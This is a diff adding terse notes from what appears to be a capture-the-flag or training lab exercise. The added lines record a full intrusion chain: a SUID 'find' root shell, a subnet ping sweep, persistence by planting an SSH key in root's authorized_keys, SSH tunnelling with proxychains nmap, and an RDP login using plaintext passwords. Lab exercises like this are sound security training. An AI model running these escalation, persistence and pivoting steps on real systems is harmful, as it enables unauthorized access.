@@ -679,7 +679,49 @@ DRY RUN
 					user3		Bob4THEPin3apples
 					Lee_Roth	Lroth
 					Lroth		anotherpassword4THEages
-					
+	ROUNDSENSOR	
+		login
+			user3		Bob4THEPin3apples
+				find . -exec /bin/bash -p \; -quit
+				bash-4.4# for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) 2>/dev/null ;done
+					192.168.28.189
+				nano /root/.ssh/authorized_keys
+					placed lin-ops public key
+					can ssh directly
+				cat ab.sh
+				cat run
+				cat run1
+				chmod +x RE_ME.obs
+				scp RE_ME.obs student@<linops>:.
+					scp RE_ME.obs student@<winops>:"C:\Users\student"
+						GHIDRA THE Shiiii
+				root@RoundSensor:~# ./RE_ME.obs 
+				Press enter key: part1part2
+				part1
+				part2
+				Entered part1
+				Entered part2
+				Your flag is: 82944
+	WIN WORKSTATION
+		LIN-OPS
+			ssh -MS /tmp/t1 root@localhost -p 62021 -fN
+			ssh -MS /tmp/t1 root@localhost -p 62021 -fN
+			ssh -MS /tmp/t1 root@localhost -p 62021 -fN
+			proxychains nmap -T5 -Pn -n 192.168.28.189
+				22/tcp   open  ssh
+				135/tcp  open  msrpc
+				139/tcp  open  netbios-ssn
+				445/tcp  open  microsoft-ds
+				3389/tcp open  ms-wbt-server
+				5357/tcp open  wsdapi
+				9999/tcp open  abyss
+			ssh -S /tmp/t1 t1 -O forward -D9050 -L62027:192.168.28.189:22 -L62028:192.168.28.189:3389
+			xfreerdp /u:Aaron /p:appleBottomJ3an$ /v:127.0.0.1:62028 +clipboard /dynamic-resolution
+		FreeRDP Window
+			File Explorer
+				C:\Users\Public\Public Documents\Flag
+					Secret squirrels.
+				C:\Users\Aaron\temp\putty
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 Scheme of Maneuver:
